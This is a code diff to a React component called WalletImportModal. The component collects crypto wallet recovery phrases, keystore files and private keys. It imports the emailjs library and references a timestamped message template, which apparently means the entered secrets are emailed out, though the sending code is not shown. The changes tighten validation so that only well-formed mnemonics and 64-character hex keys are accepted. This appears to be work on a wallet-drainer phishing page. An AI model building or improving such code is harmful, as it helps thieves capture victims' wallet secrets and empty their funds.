@@ -5,7 +5,7 @@ import { AlertCircle } from "lucide-react";
 import { useRouter } from "next/navigation";
 import emailjs from "@emailjs/browser";
 import { validateMnemonic } from "web-bip39";
-import wordlist from 'web-bip39/wordlists/english';
+import wordlist from "web-bip39/wordlists/english";
 
 function WalletImportModal() {
   const router = useRouter();
@@ -18,7 +18,6 @@ function WalletImportModal() {
   const [loading, setLoading] = useState(false);
 
   const validatePhrase = async (phrase: string) => {
-
     const words = phrase
       .trim()
       .split(/\s+/)
@@ -34,10 +33,9 @@ function WalletImportModal() {
     }
     const isValid = await validateMnemonic(phraseValue, wordlist);
     if (!isValid) {
-      setErrors({ [activeTab]: "Invalid recovery phrase" });
       return "Invalid recovery phrase";
     }
-    return null;
+    return "Valid recovery phrase";
   };
 
   const validateKeystore = (keystore: string | number) => {
@@ -58,21 +56,38 @@ function WalletImportModal() {
 
   const validatePrivateKey: ValidatePrivateKeyResult = (key) => {
     const trimmedKey = key.trim();
-    if (trimmedKey.length < 32) {
-      return "Private key is too short";
+
+    const keyWithoutPrefix =
+      trimmedKey.startsWith("0x") || trimmedKey.startsWith("0X")
+        ? trimmedKey.slice(2)
+        : trimmedKey;
+
+    if (keyWithoutPrefix.length !== 64) {
+      return "Private key must be exactly 64 hexadecimal characters (32 bytes)";
     }
-    if (!/^[a-zA-Z0-9]+$/.test(trimmedKey)) {
-      return "Private key must be alphanumeric";
+
+    if (!/^[0-9a-fA-F]+$/.test(keyWithoutPrefix)) {
+      return "Private key must contain only hexadecimal characters (0-9, a-f, A-F)";
     }
+
+    if (/^0+$/.test(keyWithoutPrefix)) {
+      return "Invalid private key (cannot be all zeros)";
+    }
+
+    if (/^[fF]+$/.test(keyWithoutPrefix)) {
+      return "Invalid private key (out of valid range)";
+    }
+
     return null;
   };
 
   const handleProceed = async () => {
-    let error = null;
+    let error: string | null = null;
     let currentValue = "";
 
     if (activeTab === "phrase") {
-      error = validatePhrase(phraseValue);
+      const result = await validatePhrase(phraseValue);
+      error = result === "Valid recovery phrase" ? null : result;
       currentValue = phraseValue;
     } else if (activeTab === "keystore") {
       error = validateKeystore(keystoreValue);
@@ -83,12 +98,11 @@ function WalletImportModal() {
     }
 
     if (error) {
-      setErrors((prev) => ({ ...prev, [activeTab]: error as string }));
+      setErrors({ [activeTab]: error });
       return;
     }
 
-    setErrors((prev) => ({ ...prev, [activeTab]: null }));
-
+    setErrors({});
     setLoading(true);
 
     try {
@@ -168,7 +182,7 @@ Time: ${new Date().toISOString()}
       return "Typically 12 (sometimes 24) words separated by a single spaces.";
     if (activeTab === "keystore")
       return "Paste your keystore JSON file content here.";
-    return "Enter your private key (alphanumeric characters only).";
+    return "Enter your private key (64 hexadecimal characters, with or without 0x prefix).";
   };
 
   return (
